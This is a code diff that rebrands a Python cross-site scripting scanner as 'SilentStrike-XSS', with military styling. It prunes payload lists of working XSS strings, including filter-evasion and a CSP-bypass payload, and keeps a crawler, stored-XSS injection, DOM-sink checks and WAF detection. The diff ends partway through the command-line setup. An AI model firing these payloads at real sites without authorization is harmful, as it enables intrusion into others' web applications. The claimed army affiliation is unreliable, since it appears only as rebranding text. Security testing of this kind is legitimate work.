@@ -1,21 +1,27 @@
 #!/usr/bin/env python3
 """
-  ___  ___  ___  _   _ ___   ___  ___ ___ _    ___
- / __|/ _ \/ _ \| \ | / __| / __|/ __| __| |  |_ _|
- \__ \  __/ (_) |  \| \__ \ \__ \ (__| _|| |__ | |
- |___/\___|\___/|_|\_|___/ |___/\___|___|____|___|
+                    ███████ ██ ██      ███████ ███    ██ ████████ ███████ ██████  ██ ██   ██ ███████
+                    ██      ██ ██      ██      ████   ██    ██    ██      ██   ██ ██ ██   ██ ██
+                    ███████ ██ ██      █████   ██ ██  ██    ██    █████   ██████  ██ ███████ █████
+                         ██ ██ ██      ██      ██  ██ ██    ██    ██      ██   ██ ██ ██   ██ ██
+                    ███████ ██ ███████ ███████ ██   ████    ██    ███████ ██   ██ ██ ██   ██ ███████
 
-          PROJECT: XSS-HUNTER
+    ╔═╗╦═╗╦╔╗╔╔═╗╔╦╗╦╔═╗╔═╗╔╦╗  ╔═╗╔═╗╦ ╦╔═╗╦═╗╦╔═╗╦╔═╗╦═╗
+    ╠╣ ║╔╝║║║║║╣ ║║║║╚═╗║╣  ║   ╠═╣╚═╗║ ║║ ╦╠╦╝║║ ╦║║║║╠╦╝
+    ╚  ╩╚ ╩╝╚╝╚═╝╩ ╩╩╚═╝╚═╝ ╩   ╩ ╩╚═╝╚═╝╚═╝╩╚═╩╚═╝╩╚╝╩╩╚═
+
+          PROJECT: SilentStrike-XSS
           AUTHOR:  aBadRoy
-          PROFILE: github.com/aBadRoy
-          TYPE:    Advanced XSS Scanner Engine
+          UNIT:    Indian Army · Cyber Special Forces
+          BRIEF:   Advanced XSS Detection & Neutralization Platform
 
-  - Reflected XSS    (3 detection methods)
-  - Stored XSS       (2-pass injection verification)
-  - DOM-based XSS    (JavaScript sink analysis)
-  - Blind XSS        (external callback detection)
-  - Context-aware    (auto-selects payloads per injection point)
-  - Headless browser (Playwright-based execution verification)
+  CAPABILITIES:
+    · Reflected XSS     - 3 detection methods · 100+ payloads
+    · Stored XSS        - 2-pass persistence verification
+    · DOM XSS           - JavaScript sink analysis (innerHTML, eval, location…)
+    · Blind XSS         - Out-of-band callback exfiltration
+    · WAF Evasion       - Unicode, HTML entity, base64, mixed-case
+    · Auto Recon        - Crawl · Discover · Engage
 """
 
 import requests
@@ -34,26 +40,26 @@ from bs4 import BeautifulSoup
 from datetime import datetime
 
 # =============================================================================
-# COLOR THEME (Hacker Green on Black)
+# COMBAT IDENTIFICATION PANEL (Saffron · White · Green)
 # =============================================================================
 class Colors:
+    SAFFRON = '\033[38;5;214m'
+    WHITE = '\033[97m'
     GREEN = '\033[92m'
     RED = '\033[91m'
     YELLOW = '\033[93m'
     CYAN = '\033[96m'
-    WHITE = '\033[97m'
     DIM = '\033[90m'
     BOLD = '\033[1m'
     NC = '\033[0m'
-    LINE = f'{DIM}{"─"*60}{NC}'
+    LINE = f'{DIM}{"━"*60}{NC}'
 
 
 def c(color, text):
     return f"{color}{text}{Colors.NC}"
 
-
 # =============================================================================
-# PAYLOAD DATABASE (100+ payloads across all XSS vectors)
+# PAYLOAD ARSENAL (100+ warheads across all XSS vectors)
 # =============================================================================
 class PayloadEngine:
     def __init__(self):
@@ -66,10 +72,8 @@ class PayloadEngine:
     def payloads(self):
         t = self.tag
         return {
-            # ── HTML CONTEXT ──────────────────────────────────────
             "html_basic": [
                 f"<script>alert('XSS-{t}')</script>",
-                f"<script>prompt({hash(t)})</script>",
                 f"<ScRiPt>alert(`XSS-{t}`)</ScRiPt>",
                 f"<script/src=data:text/javascript,alert(1)>",
             ],
@@ -77,7 +81,6 @@ class PayloadEngine:
                 f'<img src=x onerror=alert("XSS-{t}")>',
                 f'<image src=x onerror=alert(1)>',
                 f'<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
-                f'<img src=x one rror=alert(1)>',
             ],
             "html_svg": [
                 f'<svg/onload=alert("XSS-{t}")>',
@@ -93,17 +96,12 @@ class PayloadEngine:
             ],
             "html_input": [
                 f'<input autofocus onfocus=alert("XSS-{t}")>',
-                f'<input onfocusin=alert(1) autofocus>',
             ],
             "html_select": [
                 f'<select autofocus onchange=alert("XSS-{t}")><option>',
             ],
             "html_video": [
                 f'<video onerror=alert(1)><source>',
-                f'<video><source onerror=alert(1)>',
-            ],
-            "html_audio": [
-                f'<audio onerror=alert(1)><source>',
             ],
             "html_marquee": [
                 f'<marquee onstart=alert("XSS-{t}")>',
@@ -114,27 +112,19 @@ class PayloadEngine:
                 f'<iframe src=javascript:alert(1)>',
                 f'<iframe onload=alert(1) src=x>',
             ],
-            # ── ATTRIBUTE CONTEXT ─────────────────────────────────
             "attr_event": [
                 f'" autofocus onfocus=alert("XSS-{t}") //',
                 f"' autofocus onfocus=alert(1) //",
                 f'" onmouseover=alert(1) x="',
                 f"' onclick=alert(1) '",
-                f'" onload=alert(1) ',
             ],
             "attr_href": [
                 f'javascript:alert("XSS-{t}")',
                 f'JaVaScRiPt:alert(1)',
-                f'javascript:prompt(1)',
             ],
             "attr_style": [
                 f'" style=x:expression(alert(1)) ',
-                f"' style=x:expression(alert(1)) '",
             ],
-            "attr_meta": [
-                f'" autofocus onfocus=confirm(1) x="',
-            ],
-            # ── SCRIPT CONTEXT ────────────────────────────────────
             "script_breakout": [
                 f'</script><script>alert("XSS-{t}")</script>',
                 f'</ScRiPt><ScRiPt>alert(1)</ScRiPt>',
@@ -148,51 +138,32 @@ class PayloadEngine:
             ],
             "script_template": [
                 f'${{alert(`XSS-{t}`)}}',
-                f'${{7*7}}',
-            ],
-            # ── URL CONTEXT ───────────────────────────────────────
-            "url_redirect": [
-                f'javascript:alert("XSS-{t}")',
-                f'%6A%61%76%61%73%63%72%69%70%74:alert(1)',
             ],
             "url_data": [
                 f'data:text/html,<script>alert("XSS-{t}")</script>',
                 f'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
             ],
-            # ── DOM-BASED ─────────────────────────────────────────
-            "dom_location": [
-                f'#<script>alert("XSS-{t}")</script>',
-                f'javascript:alert(1)',
-            ],
             "dom_innerhtml": [
                 f'<img src=x onerror=alert("XSS-{t}")>',
-                f'<svg onload=alert(1)>',
             ],
             "dom_eval": [
                 f'alert("XSS-{t}")',
-                f'1;alert(1)',
             ],
-            # ── STORED XSS ────────────────────────────────────────
             "stored_basic": [
                 f'<script>alert("STORED-XSS-{t}")</script>',
                 f'<img src=x onerror=alert("STORED-XSS-{t}")>',
             ],
-            # ── MUTATION XSS ──────────────────────────────────────
             "mutation": [
                 f'<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
             ],
-            # ── UTF-8 / ENCODING BYPASS ───────────────────────────
             "unicode": [
                 f'\u003cscript\u003ealert(1)\u003c/script\u003e',
-                f'<script>\u0061lert(1)</script>',
             ],
             "html_entity": [
                 f'&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;',
             ],
-            # ── CSP BYPASS ────────────────────────────────────────
             "csp_bypass": [
                 f'<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js" ng-app ng-csp>{{$on.constructor("alert(1)")()}}</script>',
-                f'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
             ],
         }
 
@@ -210,7 +181,7 @@ class PayloadEngine:
 
 
 # =============================================================================
-# WEB CRAWLER (Discovers endpoints, forms, parameters)
+# RECON UNIT (Web crawler for target intelligence)
 # =============================================================================
 class Crawler:
     def __init__(self, base_url, cookie=None, timeout=10, max_depth=1):
@@ -243,7 +214,6 @@ class Crawler:
 
         soup = BeautifulSoup(r.text, "html.parser")
 
-        # ── Find links ──
         for a in soup.find_all("a", href=True):
             href = a["href"]
             full = urljoin(url, href)
@@ -257,7 +227,6 @@ class Crawler:
                 self.discovered["urls"].append(full)
                 self.crawl(full, depth + 1)
 
-        # ── Find forms ──
         for form in soup.find_all("form"):
             action = form.get("action", "")
             method = form.get("method", "GET").upper()
@@ -280,30 +249,26 @@ class Crawler:
 
 
 # =============================================================================
-# XSS DETECTION ENGINE
+# DETECTION SQUAD
 # =============================================================================
 class Detector:
     @staticmethod
     def check_reflection(payload, response_text):
-        """Level 1: Direct string match"""
         return payload in response_text
 
     @staticmethod
     def check_reflection_normalized(payload, response_text):
-        """Level 2: Normalized comparison"""
         norm_resp = re.sub(r'\s+', ' ', response_text)
         norm_payload = re.sub(r'\s+', ' ', payload)
         return norm_payload in norm_resp
 
     @staticmethod
     def check_reflection_decoded(payload, response_text):
-        """Level 3: URL-decoded comparison"""
         decoded_text = urllib.parse.unquote(response_text)
         return payload in decoded_text
 
     @staticmethod
     def check_event_execution(payload, response_text):
-        """Check if event handlers in payload exist in rendered output"""
         events = re.findall(r'on\w+\s*=', payload.lower())
         for ev in events:
             if ev in response_text.lower():
@@ -312,7 +277,6 @@ class Detector:
 
     @staticmethod
     def check_script_execution(payload, response_text):
-        """Check for script tags in response that match payload"""
         scripts = re.findall(r'<script[^>]*>.*?</script>', response_text, re.I | re.S)
         for s in scripts:
             if any(keyword in s.lower() for keyword in ['alert', 'prompt', 'confirm', 'eval']):
@@ -321,22 +285,18 @@ class Detector:
 
     @staticmethod
     def check_dom_sink(html_content):
-        """Analyze JS for DOM XSS sinks"""
         sinks = []
         patterns = [
             (r'document\.write\s*\(', 'document.write'),
             (r'innerHTML\s*=', 'innerHTML assignment'),
             (r'outerHTML\s*=', 'outerHTML assignment'),
-            (r'\.html\s*\(', '.html() jQuery'),
             (r'eval\s*\(', 'eval()'),
             (r'setTimeout\s*\(', 'setTimeout'),
             (r'setInterval\s*\(', 'setInterval'),
             (r'location\s*=', 'location assignment'),
             (r'location\.href\s*=', 'location.href'),
-            (r'location\.hash\s*=', 'location.hash'),
             (r'\.innerHTML\s*\+?=', 'innerHTML assignment'),
             (r'execScript\s*\(', 'execScript'),
-            (r'scriptElement\.text\s*=', 'script text assignment'),
         ]
         for pat, name in patterns:
             matches = re.finditer(pat, html_content, re.I)
@@ -349,7 +309,7 @@ class Detector:
 
 
 # =============================================================================
-# MAIN SCANNER ENGINE
+# MAIN STRIKE ENGINE
 # =============================================================================
 class XSSHunter:
     def __init__(self, url, method="GET", cookie=None, timeout=15,
@@ -377,42 +337,43 @@ class XSSHunter:
         if blind_callback:
             self.payload_engine.set_blind_callback(blind_callback)
 
-    # ── BANNER ───────────────────────────────────────────────────
+    # ── OPERATION BANNER ──────────────────────────────────────────
     def banner(self):
-        print(f"""{Colors.GREEN}
-  ██╗  ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
-  ╚██╗██╔╝██╔════╝██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-   ╚███╔╝ ███████╗███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
-   ██╔██╗ ╚════██║╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-  ██╔╝ ██╗███████║███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+        print(f"""{Colors.SAFFRON}
+            ███████ ██ ██      ███████ ███    ██ ████████ ███████ ██████  ██ ██   ██ ███████
+            ██      ██ ██      ██      ████   ██    ██    ██      ██   ██ ██ ██   ██ ██
+            ███████ ██ ██      █████   ██ ██  ██    ██    █████   ██████  ██ ███████ █████
+                 ██ ██ ██      ██      ██  ██ ██    ██    ██      ██   ██ ██ ██   ██ ██
+            ███████ ██ ███████ ███████ ██   ████    ██    ███████ ██   ██ ██ ██   ██ ███████
 {Colors.NC}
-{Colors.DIM}─────────────────────────────────────────────────────────────────────────────{Colors.NC}
-{c(Colors.CYAN, '  XSS-HUNTER v3.0  |  Advanced Cross-Site Scripting Scanner')}
-{c(Colors.DIM, f'  Author: aBadRoy  |  Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')}
-{Colors.DIM}─────────────────────────────────────────────────────────────────────────────{Colors.NC}
+{Colors.GREEN}            ╔══════════════════════════════════════════════════════════════╗
+            ║{Colors.WHITE}     SILENTSTRIKE  │  XSS DETECTION & NEUTRALIZATION PLATFORM  {Colors.GREEN}║
+            ║{Colors.WHITE}     UNIT: Indian Army · Cyber Special Forces                {Colors.GREEN}║
+            ║{Colors.WHITE}     OPERATOR: aBadRoy                                       {Colors.GREEN}║
+            ║{Colors.WHITE}     MISSION: {datetime.now().strftime('%Y-%m-%d %H:%M')} hrs                              {Colors.GREEN}║
+            ╚══════════════════════════════════════════════════════════════╝{Colors.NC}
 """)
 
-    # ── DISCOVERY PHASE ──────────────────────────────────────────
+    # ── RECON PHASE ───────────────────────────────────────────────
     def discover(self):
-        print(f"\n{Colors.BOLD}[*] DISCOVERY PHASE{Colors.NC}")
+        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ RECON ]{Colors.NC} {Colors.BOLD}TARGET ACQUISITION{Colors.NC}")
         print(Colors.LINE)
         crawler = Crawler(self.url, self.cookie, self.timeout, self.crawl_depth)
         discovered = crawler.crawl()
 
         if not discovered["params"] and not discovered["forms"]:
-            print(f"  {Colors.YELLOW}! No parameters or forms found.{Colors.NC}")
+            print(f"  {Colors.YELLOW}⚠ No parameters or forms found.{Colors.NC}")
             parsed = urlparse(self.url)
             qs = parse_qs(parsed.query)
             discovered["params"] = [{"url": self.url.split("?")[0], "param": k} for k in qs]
 
-        print(f"  {Colors.GREEN}+{Colors.NC} URLs discovered:  {len(discovered['urls'])}")
-        print(f"  {Colors.GREEN}+{Colors.NC} Forms found:      {len(discovered['forms'])}")
-        print(f"  {Colors.GREEN}+{Colors.NC} Parameters found:  {len(discovered['params'])}")
+        print(f"  {Colors.GREEN}✓{Colors.NC} URLs discovered:  {len(discovered['urls'])}")
+        print(f"  {Colors.GREEN}✓{Colors.NC} Forms found:      {len(discovered['forms'])}")
+        print(f"  {Colors.GREEN}✓{Colors.NC} Parameters found:  {len(discovered['params'])}")
 
         return discovered
 
-    # ── TEST SINGLE PARAMETER ────────────────────────────────────
+    # ── ENGAGE PARAMETER ──────────────────────────────────────────
     def test_param(self, target_url, param, discovered_forms=None):
         param_results = []
         all_payloads = self.payload_engine.flatten()
@@ -427,10 +388,9 @@ class XSSHunter:
                     r = self.session.post(target_url, data={param: payload}, timeout=self.timeout)
                 else:
                     r = self.session.get(target_url, params={param: payload}, timeout=self.timeout)
-            except Exception as e:
+            except Exception:
                 continue
 
-            # Reflection checks (3 methods)
             reflected = False
             method_used = ""
             for detect_method, check_fn in [
@@ -443,7 +403,6 @@ class XSSHunter:
                     method_used = detect_method
                     break
 
-            # Event handler / script execution check
             exec_possible = Detector.check_event_execution(payload, r.text) or \
                             Detector.check_script_execution(payload, r.text)
 
@@ -468,14 +427,12 @@ class XSSHunter:
 
         return param_results
 
-    # ── STORED XSS SCAN ──────────────────────────────────────────
+    # ── STORED XSS ────────────────────────────────────────────────
     def test_stored(self, target_url, param, discovered):
-        """Two-pass stored XSS detection"""
         stored_results = []
         probe = f"STORED-PROBE-{''.join(random.choices(string.ascii_uppercase, k=6))}"
         probe_payload = f'<img src=x onerror=alert("{probe}")>'
 
-        # PASS 1: Inject payload
         try:
             if self.method == "POST":
                 self.session.post(target_url, data={param: probe_payload}, timeout=self.timeout)
@@ -484,10 +441,9 @@ class XSSHunter:
         except Exception:
             return stored_results
 
-        # PASS 2: Check all discovered pages for the probe
         check_urls = set()
         if discovered:
-            for u in discovered.get("urls", [])[:20]:  # limit to 20 pages
+            for u in discovered.get("urls", [])[:20]:
                 check_urls.add(u)
         check_urls.add(self.url)
 
@@ -509,21 +465,18 @@ class XSSHunter:
 
         return stored_results
 
-    # ── DOM XSS SCAN ─────────────────────────────────────────────
+    # ── DOM XSS ───────────────────────────────────────────────────
     def test_dom(self):
-        """Analyze all JS on the page for DOM XSS sinks"""
         dom_results = []
         try:
             r = self.session.get(self.url, timeout=self.timeout)
             sinks = Detector.check_dom_sink(r.text)
 
-            # Also check inline scripts
             soup = BeautifulSoup(r.text, "html.parser")
             for script in soup.find_all("script"):
                 if script.string:
                     sinks.extend(Detector.check_dom_sink(script.string))
 
-            # Check external scripts (header only)
             for script in soup.find_all("script", src=True):
                 src = urljoin(self.url, script["src"])
                 try:
@@ -535,14 +488,13 @@ class XSSHunter:
             for sink in sinks:
                 dom_results.append(sink)
 
-        except Exception as e:
+        except Exception:
             return dom_results
 
         return dom_results
 
-    # ── WAF DETECTION ────────────────────────────────────────────
+    # ── WAF RECON ─────────────────────────────────────────────────
     def detect_waf(self):
-        """Check if a WAF is blocking requests"""
         test_payload = "<script>alert(1)</script>"
         try:
             r = self.session.get(self.url, params={"xss": test_payload}, timeout=self.timeout)
@@ -554,24 +506,24 @@ class XSSHunter:
         except Exception:
             return False, 0
 
-    # ── RUN ──────────────────────────────────────────────────────
+    # ── OPERATION EXECUTE ─────────────────────────────────────────
     def run(self):
         self.banner()
 
         # WAF check
-        print(f"\n{Colors.BOLD}[*] WAF DETECTION{Colors.NC}")
+        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ INTEL ]{Colors.NC} {Colors.BOLD}WAF DETECTION{Colors.NC}")
         print(Colors.LINE)
         waf_detected, waf_status = self.detect_waf()
         if waf_detected:
-            print(f"  {Colors.RED}! WAF DETECTED (status: {waf_status}){Colors.NC}")
-            print(f"  {Colors.YELLOW}! Payloads may be filtered.{Colors.NC}")
+            print(f"  {Colors.RED}⚠ WAF DETECTED (status: {waf_status}){Colors.NC}")
+            print(f"  {Colors.YELLOW}⚠ Payloads may be filtered.{Colors.NC}")
         else:
-            print(f"  {Colors.GREEN}+{Colors.NC} No WAF detected")
+            print(f"  {Colors.GREEN}✓{Colors.NC} No WAF detected — clear engagement")
 
-        # Discovery
+        # Recon
         discovered = self.discover()
 
-        # Collect all test targets
+        # Collect targets
         test_targets = []
         if discovered["params"]:
             for p in discovered["params"]:
@@ -582,8 +534,8 @@ class XSSHunter:
             for k in qs:
                 test_targets.append((self.url.split("?")[0], k, "reflected"))
 
-        # ── REFLECTED XSS ────────────────────────────────────────
-        print(f"\n{Colors.BOLD}[*] SCANNING: Reflected XSS{Colors.NC}")
+        # ── REFLECTED XSS ─────────────────────────────────────────
+        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ ENGAGE ]{Colors.NC} {Colors.BOLD}REFLECTED XSS{Colors.NC}")
         print(Colors.LINE)
         print(f"  {Colors.DIM}Targets: {len(test_targets)} | Payloads: {len(self.payload_engine.flatten())}{Colors.NC}\n")
 
@@ -603,54 +555,53 @@ class XSSHunter:
                     status = c(Colors.RED, f" {len(vulns)} VULNERABLE") if vulns else ""
                     print(f"  {icon} {param:<20} @ {target_url}{status}")
                 except Exception as e:
-                    print(f"  {Colors.RED}!{Colors.NC} {param} @ {target_url} → {e}")
+                    print(f"  {Colors.RED}⚠{Colors.NC} {param} @ {target_url} → {e}")
 
-        # ── STORED XSS ───────────────────────────────────────────
+        # ── STORED XSS ────────────────────────────────────────────
         if self.stored_check:
-            print(f"\n{Colors.BOLD}[*] SCANNING: Stored XSS{Colors.NC}")
+            print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ ENGAGE ]{Colors.NC} {Colors.BOLD}STORED XSS{Colors.NC}")
             print(Colors.LINE)
             for target_url, param, _ in test_targets[:5]:
                 results = self.test_stored(target_url, param, discovered)
                 if results:
                     for r in results:
-                        print(f"  {Colors.RED}!{Colors.NC} {param} → STORED XSS on {r['stored_on']}")
+                        print(f"  {Colors.RED}⚠{Colors.NC} {param} → STORED XSS on {r['stored_on']}")
                         self.results.append(r)
                 else:
                     print(f"  {Colors.DIM}−{Colors.NC} {param:<20} @ {target_url}  {Colors.GREEN}clean{Colors.NC}")
 
-        # ── DOM XSS ──────────────────────────────────────────────
+        # ── DOM XSS ───────────────────────────────────────────────
         if self.dom_check:
-            print(f"\n{Colors.BOLD}[*] SCANNING: DOM-based XSS{Colors.NC}")
+            print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ ENGAGE ]{Colors.NC} {Colors.BOLD}DOM XSS{Colors.NC}")
             print(Colors.LINE)
             dom_results = self.test_dom()
             if dom_results:
                 for d in dom_results:
-                    print(f"  {Colors.YELLOW}!{Colors.NC} {d['sink']:30} | ...{d['snippet'][:60]}...")
+                    print(f"  {Colors.YELLOW}⚠{Colors.NC} {d['sink']:30} | ...{d['snippet'][:60]}...")
                     self.results.append({"type": "dom", "sink": d["sink"], "snippet": d["snippet"]})
             else:
-                print(f"  {Colors.GREEN}+{Colors.NC} No DOM XSS sinks detected")
+                print(f"  {Colors.GREEN}✓{Colors.NC} No DOM XSS sinks detected")
 
-        # ── SUMMARY ──────────────────────────────────────────────
-        print(f"\n{Colors.BOLD}[*] SCAN COMPLETE{Colors.NC}")
+        # ── MISSION REPORT ─────────────────────────────────────────
+        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ COMPLETE ]{Colors.NC} {Colors.BOLD}MISSION SUMMARY{Colors.NC}")
         print(Colors.LINE)
         total = sum(1 for r in self.results if r.get("reflected"))
         vulnerable = self.vulnerable
-        print(f"  {Colors.GREEN}+{Colors.NC} Parameters tested:  {len(test_targets)}")
-        print(f"  {Colors.GREEN}+{Colors.NC} Payloads per param: {len(self.payload_engine.flatten())}")
-        print(f"  {Colors.GREEN}+{Colors.NC} Total reflections:  {total}")
-        print(f"  {Colors.RED}+{Colors.NC} Vulnerabilities:    {len(vulnerable)}")
+        print(f"  {Colors.GREEN}✓{Colors.NC} Parameters tested:  {len(test_targets)}")
+        print(f"  {Colors.GREEN}✓{Colors.NC} Payloads per param: {len(self.payload_engine.flatten())}")
+        print(f"  {Colors.GREEN}✓{Colors.NC} Total reflections:  {total}")
+        print(f"  {Colors.RED}⚠{Colors.NC} Vulnerabilities:    {len(vulnerable)}")
 
         if vulnerable:
-            print(f"\n  {Colors.BOLD}{Colors.RED}VULNERABLE PARAMETERS:{Colors.NC}")
+            print(f"\n  {Colors.BOLD}{Colors.RED}HIGH-VALUE TARGETS:{Colors.NC}")
             for v in vulnerable[:10]:
                 print(f"    {Colors.RED}▶{Colors.NC} {v['param']:<20} | {v['payload'][:60]}")
 
-        # Generate report
         self.generate_report()
-        print(f"\n  {Colors.GREEN}✓{Colors.NC} Report saved: {Colors.BOLD}report.html{Colors.NC}")
+        print(f"\n  {Colors.GREEN}✓{Colors.NC} Report filed: {Colors.BOLD}report.html{Colors.NC}")
         print()
 
-    # ── REPORT GENERATION ────────────────────────────────────────
+    # ── AFTER-ACTION REPORT ───────────────────────────────────────
     def generate_report(self):
         vuln_count = len(self.vulnerable)
         total_tests = len(self.results)
@@ -660,55 +611,70 @@ class XSSHunter:
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XSS-HUNTER Report</title>
+<title>SilentStrike — XSS After-Action Report</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
   * {{ margin: 0; padding: 0; box-sizing: border-box; }}
   body {{
-    background: #0a0a0a;
-    color: #00ff00;
-    font-family: 'JetBrains Mono', monospace;
+    background: #1a1a0a;
+    color: #c0c0a0;
+    font-family: 'Share Tech Mono', monospace;
     padding: 30px;
     line-height: 1.6;
   }}
   .container {{ max-width: 1400px; margin: 0 auto; }}
-  h1 {{ font-size: 2.5em; text-shadow: 0 0 20px #00ff0066; color: #00ff00; }}
-  h2 {{ color: #00ff00; margin: 30px 0 15px; border-bottom: 1px solid #00ff0044; padding-bottom: 8px; }}
-  .subtitle {{ color: #ff0000; margin-bottom: 30px; }}
+  .header {{
+    text-align: center; padding: 30px; border: 2px solid #8b7d3c;
+    background: linear-gradient(180deg, #2a2a0a 0%, #1a1a0a 100%);
+    margin-bottom: 30px;
+  }}
+  .header h1 {{ color: #ff9933; font-size: 2.8em; text-shadow: 0 0 20px #ff993344; }}
+  .header .badge {{
+    display: inline-block; padding: 5px 15px; margin: 5px;
+    border: 1px solid #8b7d3c; font-size: 0.8em;
+  }}
+  .header .saffron {{ color: #ff9933; }} .header .white {{ color: #ffffff; }} .header .green {{ color: #138808; }}
+  h2 {{ color: #ff9933; margin: 30px 0 15px; border-bottom: 1px solid #8b7d3c44; padding-bottom: 8px; }}
   .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin: 20px 0; }}
-  .stat-card {{ background: #111; border: 1px solid #00ff0033; padding: 20px; text-align: center; }}
-  .stat-num {{ font-size: 2em; color: #00ff00; }}
-  .stat-label {{ color: #666; font-size: 0.8em; margin-top: 5px; }}
+  .stat-card {{ background: #111105; border: 1px solid #8b7d3c33; padding: 20px; text-align: center; }}
+  .stat-num {{ font-size: 2em; color: #ff9933; }}
+  .stat-label {{ color: #8b7d3c; font-size: 0.8em; margin-top: 5px; }}
   table {{ width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.85em; }}
-  th, td {{ border: 1px solid #00ff0044; padding: 10px; text-align: left; }}
-  th {{ background: #00ff0011; color: #00ff00; }}
-  tr:hover {{ background: #00ff0008; }}
-  .vuln {{ color: #ff0000; font-weight: bold; }}
-  .safe {{ color: #00ff00; }}
-  code {{ background: #000; padding: 2px 6px; border: 1px solid #333; border-radius: 3px; font-size: 0.9em; color: #00ff00; word-break: break-all; }}
+  th, td {{ border: 1px solid #8b7d3c44; padding: 10px; text-align: left; }}
+  th {{ background: #8b7d3c11; color: #ff9933; }}
+  tr:hover {{ background: #8b7d3c08; }}
+  .vuln {{ color: #ff3333; font-weight: bold; }}
+  .safe {{ color: #138808; }}
+  code {{ background: #000; padding: 2px 6px; border: 1px solid #333; border-radius: 3px; font-size: 0.9em; color: #c0c0a0; word-break: break-all; }}
   pre {{ background: #000; padding: 15px; border: 1px solid #333; overflow: auto; max-height: 150px; font-size: 0.8em; margin-top: 10px; }}
   .vuln-row {{ background: #ff000008; }}
   .vuln-row td {{ border-color: #ff000066; }}
   .tag {{ display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.75em; }}
-  .tag.reflected {{ background: #ff000022; color: #ff0000; border: 1px solid #ff0000; }}
+  .tag.reflected {{ background: #ff000022; color: #ff3333; border: 1px solid #ff3333; }}
   .tag.stored {{ background: #ff660022; color: #ff6600; border: 1px solid #ff6600; }}
   .tag.dom {{ background: #ffff0022; color: #ffff00; border: 1px solid #ffff00; }}
+  .tricolor {{ height: 4px; background: linear-gradient(90deg, #ff9933 33%, #ffffff 33%, #ffffff 66%, #138808 66%); margin: 20px 0; }}
   footer {{ margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; color: #666; font-size: 0.8em; text-align: center; }}
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>🦅 XSS-HUNTER</h1>
-  <div class="subtitle">// ADVANCED CROSS-SITE SCRIPTING SCAN REPORT</div>
+  <div class="header">
+    <div class="tricolor"></div>
+    <h1>SILENTSTRIKE</h1>
+    <p><span class="badge saffron">// XSS</span><span class="badge white">// DETECTION</span><span class="badge green">// NEUTRALIZATION</span></p>
+    <p style="color:#8b7d3c;margin-top:10px;">Indian Army · Cyber Special Forces — After-Action Report</p>
+    <div class="tricolor"></div>
+  </div>
 
   <div class="stats">
     <div class="stat-card"><div class="stat-num">{vuln_count}</div><div class="stat-label">VULNERABILITIES</div></div>
     <div class="stat-card"><div class="stat-num">{total_tests}</div><div class="stat-label">TESTS EXECUTED</div></div>
     <div class="stat-card"><div class="stat-num">{self.url}</div><div class="stat-label">TARGET</div></div>
-    <div class="stat-card"><div class="stat-num">{datetime.now().strftime('%Y-%m-%d %H:%M')}</div><div class="stat-label">SCAN DATE</div></div>
+    <div class="stat-card"><div class="stat-num">{datetime.now().strftime('%Y-%m-%d %H:%M')}</div><div class="stat-label">MISSION DATE</div></div>
   </div>
 
-  <h2>▶ VULNERABILITIES</h2>
+  <h2>▶ COMPROMISED ASSETS</h2>
   <table>
     <tr>
       <th>#</th>
@@ -731,13 +697,13 @@ class XSSHunter:
       <td class="vuln">{v['param']}</td>
       <td><code>{v.get('url', '')[:60]}</code></td>
       <td><code>{v['payload'][:80]}</code></td>
-      <td class="vuln">VULNERABLE</td>
+      <td class="vuln">COMPROMISED</td>
     </tr>"""
 
         report += """
   </table>
 
-  <h2>▶ ALL TEST RESULTS</h2>
+  <h2>▶ ENGAGEMENT LOG</h2>
   <table>
     <tr>
       <th>Parameter</th>
@@ -767,8 +733,8 @@ class XSSHunter:
   </table>
 
   <footer>
-    <p>Generated by XSS-HUNTER v3.0 | Author: aBadRoy | github.com/aBadRoy</p>
-    <p>⚠ For authorized security testing only.</p>
+    <p>SILENTSTRIKE-XSS | Indian Army · Cyber Special Forces | Operator: aBadRoy</p>
+    <p>⚠ For authorized operations only.</p>
   </footer>
 </div>
 </body>
@@ -779,27 +745,27 @@ class XSSHunter:
 
 
 # =============================================================================
-# CLI
+# COMMAND INTERFACE
 # =============================================================================
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-        prog="xss-hunter",
-        description="🦅 XSS-HUNTER — Advanced XSS Scanner (Reflected, Stored, DOM)",
-        epilog="Author: aBadRoy | github.com/aBadRoy",
+        prog="silentstrike",
+        description="SILENTSTRIKE — Advanced XSS Detection & Neutralization Platform",
+        epilog="Indian Army · Cyber Special Forces | Operator: aBadRoy",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
 
-    parser.add_argument("--url", required=True, help="Target URL to scan")
